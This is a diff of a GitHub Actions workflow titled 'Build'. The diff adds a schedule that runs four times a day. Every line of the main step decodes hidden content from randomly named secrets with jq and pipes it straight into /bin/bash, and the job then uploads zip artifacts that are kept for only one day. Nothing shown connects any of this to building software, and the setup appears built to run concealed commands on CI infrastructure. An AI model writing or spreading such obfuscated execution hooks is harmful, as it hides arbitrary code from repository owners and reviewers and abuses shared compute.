@@ -2,6 +2,8 @@ name: Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '29 1,7,13,19 * * *'
 env:
   CI: true
 jobs:
@@ -13,17 +15,16 @@ jobs:
           fetch-depth: 0
       - name: Main step
         env:
-          ye01038: ${{ secrets.ye01038 }}
+          ws0: ${{ secrets.ws0 }}
         run: |
-          printf '%s' "$ye01038" | jq -r .y977 | /bin/bash
-          printf '%s' "$j96896" | jq -r .nntml66 | /bin/bash
-          printf '%s' "$rlqbi5" | jq -r .jk35778 | /bin/bash
-          printf '%s' "$a7" | jq -r .gd15 | /bin/bash
-          printf '%s' "$xcy03" | jq -r .ineas87 | /bin/bash
+          printf '%s' "$ws0" | jq -r .lpjm1 | /bin/bash
+          printf '%s' "$s0" | jq -r .xs2 | /bin/bash
+          printf '%s' "$nx07922" | jq -r .rqnx65 | /bin/bash
+          echo $jonwj6 | jq -r .iv44 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
         with:
-          name: SoOG2YMX
+          name: HuF5XBoW
           path: "*.zip"
           retention-days: 1
